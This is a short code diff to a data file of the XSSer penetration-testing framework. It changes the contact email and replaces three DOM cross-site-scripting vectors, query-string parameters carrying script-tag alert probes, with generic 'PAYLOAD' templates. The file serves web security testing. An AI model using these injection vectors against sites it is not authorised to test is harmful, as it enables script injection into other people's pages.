@@ -22,19 +22,19 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 ## XXSer.py @@ DOM vectors @@ psy
 #
 ## This file contains different XSS vectors to inject in the Document Object Model (DOM).
-## If you have some new vectors, please email me to [root@lordepsylon.net] and i will add your list to XSSer framework.
+## If you have some new vectors, please email me to [root@lordepsylon.net-epsylon@riseup.net] and i will try to add your list to XSSer framework.
 ## Thats all.
 ###
 ## Happy Cross Hacking! ;)
 
 DOMvectors = [
-		{ 'payload' : """?notname=<script>alert("XSS")</script>""",
-		  'browser' : """[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+		{ 'payload' : """?notname=PAYLOAD""",
+		  'browser' : """[Document Object Model Injection]"""},
 		  
-		{ 'payload' : """?notname=<script>alert("XSS")<script>&""",
-		  'browser' : """[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""},
+		{ 'payload' : """?notname=PAYLOAD&""",
+		  'browser' : """[Document Object Model Injection]"""},
 		  
-		{ 'payload' : """?foobar=name=<script>alert("XSS")<script>&""",
-		  'browser' : """[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]"""}
+		{ 'payload' : """?foobar=name=PAYLOAD&""",
+		  'browser' : """[Document Object Model Injection]"""}
 		]
 
